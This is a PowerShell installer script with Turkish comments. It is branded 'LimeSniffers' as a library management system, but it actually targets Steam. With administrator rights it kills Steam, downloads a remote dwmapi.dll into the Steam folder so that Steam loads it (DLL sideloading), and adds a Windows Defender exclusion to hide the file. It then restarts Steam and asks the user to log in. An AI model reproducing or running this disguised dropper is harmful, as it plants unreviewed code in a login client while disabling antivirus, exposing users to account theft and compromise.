# LimeSniffers - Professional Installation Script
$ErrorActionPreference = "Stop"
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

function Show-Logo {
    cls
    Write-Host @"
    
  _      _                _____       _  __  __               
 | |    (_)              / ____|     (_)/ _|/ _|              
 | |     _ _ __ ___   __| (___  _ __  _| |_| |_ ___ _ __ ___ 
 | |    | | '_ ` _ \ / _ \\___ \| '_ \| |  _|  _/ _ \ '__/ __|
 | |____| | | | | | |  __/____) | | | | | | | ||  __/ |  \__ \
 |______|_|_| |_| |_|\___|_____/|_| |_|_|_| |_| \___|_|  |___/
                                                              
    >>> Cloud-Based Library Management System <<<
"@ -ForegroundColor Green
}

function ForceStopProcess($processName) {
    if (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host "[*] $processName kapatılıyor..." -ForegroundColor Yellow
        Get-Process $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Get-Process $processName -ErrorAction SilentlyContinue) {
            Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    }
}

function CheckAndPromptProcess($processName, $message) {
    while (Get-Process $processName -ErrorAction SilentlyContinue) {
        Write-Host "`r$message" -ForegroundColor Red -NoNewline
        Start-Sleep 1.5
    }
    Write-Host "" 
}

# --- BAŞLANGIÇ ---

# 1. Yönetici Yetkisi Kontrolü
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[!] Lütfen bu betiği YÖNETİCİ olarak çalıştırın!" -ForegroundColor Red
    pause
    exit
}

Show-Logo

# 2. Steam'i Kapat
ForceStopProcess "steam"
CheckAndPromptProcess "Steam" "[Lütfen Steam istemcisinden tamamen çıkış yapın...]"

# 3. Steam Yolunu Bul
$steamPath = ""
$steamRegPath = 'HKCU:\Software\Valve\Steam'
if (Test-Path $steamRegPath) {
    $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
    if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name) {
        $steamPath = $properties.SteamPath
    }
}

if ([string]::IsNullOrWhiteSpace($steamPath) -or !(Test-Path $steamPath)) {
    Write-Host "[-] Steam istemcisi bulunamadı." -ForegroundColor Red
    Start-Sleep 5
    exit
}

Write-Host "[+] Steam yolu: $steamPath" -ForegroundColor Green

# 4. DLL İndir
# Not: DLL ismini senin sistemine göre 'version.dll' veya 'xinput1_4.dll' yapabilirsin. 
# dwmapi.dll indiriliyor
$dllPath = Join-Path $steamPath "dwmapi.dll"
$dllUrl = "https://github.com/PromaxTheCoderx/LimeTools/releases/download/v1/dwmapi.dll"


try {
    Write-Host "[*] LimeSniffers çekirdeği indiriliyor..." -ForegroundColor Cyan
    Invoke-RestMethod -Uri $dllUrl -OutFile $dllPath -ErrorAction Stop
    try { Add-MpPreference -ExclusionPath $dllPath -ErrorAction SilentlyContinue } catch {}
}
catch {
    Write-Host "[-] İndirme hatası: $($_.Exception.Message)" -ForegroundColor Red
    pause
    exit
}

# 5. Steam'i Yeniden Başlat
Write-Host "[+] Kurulum başarıyla tamamlandı!" -ForegroundColor Green
Write-Host "[*] Steam başlatılıyor..." -ForegroundColor Gray

$steamExePath = Join-Path $steamPath "steam.exe"
Start-Process $steamExePath
Start-Process "steam://"

Write-Host "[LimeSniffers Aktif! Lütfen Steam'e giriş yapın.]" -ForegroundColor Green

for ($i = 5; $i -ge 0; $i--) {
    Write-Host "`r[Bu pencere $i saniye içinde kapanacak...]" -NoNewline
    Start-Sleep -Seconds 1
}
exit
